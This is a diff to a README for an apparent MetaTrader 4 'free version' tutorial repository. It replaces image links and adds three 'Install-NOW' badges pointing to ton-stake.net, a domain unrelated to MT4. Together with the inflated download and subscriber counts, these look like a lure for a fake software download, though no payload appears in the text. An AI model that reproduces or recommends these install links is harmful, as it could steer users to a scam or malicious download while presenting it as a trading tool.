@@ -2,8 +2,8 @@
 
 [<span style="background-color: #ff9f43; color: white; padding: 5px 10px; border-radius: 5px; box-shadow: 2px 2px 4px rgba(0,0,0,0.2);">Downloads: 40K+</span>] | [<span style="background-color: #6ab04c; color: white; padding: 5px 10px; border-radius: 5px; box-shadow: 2px 2px 4px rgba(0,0,0,0.2);">Subscribers: 18K+</span>] | [<span style="background-color: #3498db; color: white; padding: 5px 10px; border-radius: 5px; box-shadow: 2px 2px 4px rgba(0,0,0,0.2);">Last Updated: June 2025</span>]  
 
-![MT4 Banner](https://www.google.com/url?sa=i&url=https%3A%2F%2Fwww.freepik.com%2Ffree-vector%2Ftrading-platform-banner-design_78912345.htm&psig=AOvVaw3X8Y2Q&ust=1729476805487000&source=images&cd=vfe&opi=89978449&ved=0CBAQjRxqFwoTCODi5b3D2IcDFQAAAAAdAAAAABAE)  
-*Banner for MT4 – edit text to "MT4 Free Version" for branding!*  
+![MT4 Banner](https://eatradingacademy.com/wp-content/uploads/2020/07/the-best-expert-advisor-for-mt4.jpg)  
+ 
 
 **Description**: Explore the world of trading with the **MetaTrader 4 (MT4) Free Version Hub** in 2025! This repository offers comprehensive tutorials, sample strategies, and resources for the free demo version and limited MT4 base version. Join our community with 40K+ downloads and 18K+ subscribers to master forex and stock trading!  
 
@@ -33,6 +33,8 @@ Start your MT4 journey with these detailed steps to access the free version! �
 6. **Troubleshooting** ❓  
    If issues occur, disable your VPN, check your internet, or contact your broker’s support.  
 
+[![Install MT4](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
+
 ---
 
 ## 💡 Why Choose MT4 Free Version Hub  
@@ -43,6 +45,8 @@ Start your MT4 journey with these detailed steps to access the free version! �
 - 🤖 **Automation Tools**: Use Expert Advisors (EAs) for automated trading.  
 - 🌍 **Active Community**: Supported by 40K+ downloads and 18K+ subscribers.  
 - 📅 **2025 Updates**: Stay current with the latest MT4 features.  
+
+[![Install MT4](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
 
 ---
 
@@ -59,6 +63,8 @@ Start your MT4 journey with these detailed steps to access the free version! �
 - 📉 **Stock Analysis**: Analyze stock trends with historical data.  
 - 🤖 **Algo Trading**: Develop and test custom EAs.  
 - 📚 **Skill Building**: Learn from 18K+ subscriber strategies.  
+
+[![Install MT4](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
 
 ---
 
@@ -85,16 +91,16 @@ Start your MT4 journey with these detailed steps to access the free version! �
 ## 📸 Screenshots  
 
 **MT4 Workspace**  
-![Workspace](https://www.google.com/url?sa=i&url=https%3A%2F%2Funsplash.com%2Fphotos%2Fmodern-trading-interface-5XMQcR3s5nQ&psig=AOvVaw3X8Y2Q&ust=1729476805487000&source=images&cd=vfe&opi=89978449&ved=0CBAQjRxqFwoTCODi5b3D2IcDFQAAAAAdAAAAABAE)  
-*Main interface with market watch and chart window.*  
+![Workspace](https://fxscouts.ph/wp-content/uploads/2019/05/MT4-Interface-Overview_w9vyei.jpg)  
+ 
 
 **Chart Tools**  
-![Charts](https://www.google.com/url?sa=i&url=https%3A%2F%2Fwww.pexels.com%2Fphoto%2Ftrading-chart-tools-159546&psig=AOvVaw3X8Y2Q&ust=1729476805487000&source=images&cd=vfe&opi=89978449&ved=0CBAQjRxqFwoTCODi5b3D2IcDFQAAAAAdAAAAABAE)  
-*Apply indicators and draw trendlines.*  
+![Charts](https://forextraininggroup.com/wp-content/uploads/2017/02/MT4-chart-forex-tools.png)  
+ 
 
 **Expert Advisors Panel**  
-![EAs](https://www.google.com/url?sa=i&url=https%3A%2F%2Fwww.pexels.com%2Fphoto%2Ftrading-ea-panel-159547&psig=AOvVaw3X8Y2Q&ust=1729476805487000&source=images&cd=vfe&opi=89978449&ved=0CBAQjRxqFwoTCODi5b3D2IcDFQAAAAAdAAAAABAE)  
-*Manage automated trading strategies.*  
+![EAs](https://i.ytimg.com/vi/567GnG7hl3o/maxresdefault.jpg)  
+ 
 
 ---
 
